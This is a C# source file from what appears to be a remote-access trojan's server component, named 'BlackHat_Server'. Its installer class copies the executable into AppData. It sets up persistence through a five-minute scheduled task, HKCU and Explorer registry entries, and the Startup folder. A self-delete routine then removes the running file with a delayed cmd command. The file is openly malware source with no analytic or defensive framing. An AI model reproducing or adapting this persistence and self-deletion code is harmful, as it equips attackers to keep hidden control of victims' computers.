using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace BlackHat_Server.Class
{


    internal class InstallClass
    {
        private static string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n \n  <Triggers>\n    <CalendarTrigger>\n      <Repetition>\n        <Interval>PT5M</Interval>\n        <Duration>P1D</Duration>\n        <StopAtDurationEnd>false</StopAtDurationEnd>\n      </Repetition>\n      <StartBoundary>2021-01-01T23:04:28</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n  </Triggers>\n  \n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>{{srvPath}}</Command>\n    </Exec>\n  </Actions>\n</Task>";
        /// <summary>
        ///     Avvia thread di installazione
        /// </summary>
        public void StartInstallTHread()
        {
            var t = new Thread(InstallServer)
            {
                IsBackground = true
            };
            t.Start();
        }


        /// <summary>
        ///     Installo il server
        /// </summary>
        private void InstallServer()
        {
            
            if (ST_Client.Instance.UseTaskScheduler)
                this.InstallTaskScheduler(ST_Client.Instance.sAppDataInstall);
            
            if (ST_Client.Instance.bUseHKCU)
                InstallHCKU(ST_Client.Instance.sHKCUEntry, ST_Client.Instance.sAppDataInstall);
            
            if (ST_Client.Instance.bUseExplorer)
                InstallExplorer(ST_Client.Instance.sExplorerEntry, ST_Client.Instance.sAppDataInstall);
            
            if (ST_Client.Instance.bUseStartupFolder)
                CopyInStartup(ST_Client.Instance.sStartupFileName);
        }

        private void InstallTaskScheduler(string appDataPath)
        {
            try
            {
                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                var finalDestination = Path.Combine(appData, appDataPath);
            
                // COPIO IL FILE IN APPDATA SE NON ESISTE
                if (!File.Exists(finalDestination))
                {
                    if (!Directory.Exists(Directory.GetParent(finalDestination).FullName))
                        Directory.CreateDirectory(Directory.GetParent(finalDestination).FullName);

                    File.Copy(Application.ExecutablePath, finalDestination);
                }

                var creationXml = xml.Replace("{{srvPath}}", finalDestination);
                var fileName = $"{Guid.NewGuid():N}.xml";
                var xmlDestination = Path.Combine(Path.GetDirectoryName(finalDestination), fileName);
                File.WriteAllText(xmlDestination,creationXml);
                var dosRunner = new DosRunner();
                dosRunner.ExecuteCommand($"schtasks.exe /Create /XML {fileName} /tn {ST_Client.Instance.TaskSchedulerName}", Path.GetDirectoryName(finalDestination));
                File.Delete(xmlDestination);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
          
        }
        //-----------------------------------------

        /// <summary>
        ///     Installo su registro HCKU
        /// </summary>
        /// <param name="regEntry"></param>
        /// <param name="appDataPath"></param>
        private void InstallHCKU(string regEntry, string appDataPath)
        {
            try
            {
                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                var finalDestination = Path.Combine(appData, appDataPath);

                var rm = new RegistryManager();
                
                rm.AddHKCUReg(regEntry, finalDestination);


                // COPIO IL FILE IN APPDATA SE NON ESISTE
                if (!File.Exists(finalDestination))
                {
                    if (!Directory.Exists(Directory.GetParent(finalDestination).FullName))
                        Directory.CreateDirectory(Directory.GetParent(finalDestination).FullName);

                    File.Copy(Application.ExecutablePath, finalDestination);
                }
                
                // TaskService.Instance.AddTask("Test4", new DailyTrigger()
                //     {
                //         Repetition = new RepetitionPattern(TimeSpan.FromMinutes(5),TimeSpan.Zero)
                //     } ,
                //     new ExecAction(finalDestination));
                
            }
            catch (Exception ex)
            {
                var errror = ex.Message;
            }
        }
        //------------------------------------------


        /// <summary>
        ///     Installo su registro EXPLORER
        /// </summary>
        /// <param name="regEntry"></param>
        /// <param name="appDataPath"></param>
        private void InstallExplorer(string regEntry, string appDataPath)
        {
            try
            {
                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                var finalDestination = Path.Combine(appData, appDataPath);

                var rm = new RegistryManager();

                rm.AddExplorerReg(regEntry, finalDestination);


                // COPIO IL FILE IN APPDATA SE NON ESISTE
                if (!File.Exists(finalDestination))
                {
                    if (!Directory.Exists(Directory.GetParent(finalDestination).FullName))
                        Directory.CreateDirectory(Directory.GetParent(finalDestination).FullName);

                    File.Copy(Application.ExecutablePath, finalDestination);
                }
            }
            catch
            {
            }
        }
        //------------------------------------------


        /// <summary>
        ///     Copio il server nella cartella startup con un nome FILE PASSATO
        /// </summary>
        /// <param name="filename"></param>
        private void CopyInStartup(string filename)
        {
            var path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            var mynameEntire = Application.ExecutablePath;


            var finalDest = Path.Combine(path, filename);

            try
            {
                // SE NON ESISTE MI CREO IL FILE ALTRIMENTI L'HO GIà CREATO!
                if (!File.Exists(finalDest))
                    File.Copy(mynameEntire, finalDest);
            }
            catch
            {
            }
        }
        //-------------------------------------------------


        /// <summary>
        ///     Crea Processo CMD per l'eliminazione del file in esecuzione dopo 10 SEC
        ///     DOPO CHIUDE L'APPLICAZIONE!!!!!!!!!
        /// </summary>
        public void DeleteMySelf()
        {
            var arg = string.Format("/C choice /C Y /N /D Y /T 9 & Del \"{0}\"", Application.ExecutablePath);

            var dr = new DosRunner();

            dr.RunDosSelfDelete(arg);

            Application.Exit();
        }
        //-----------------------------------------------
    }
}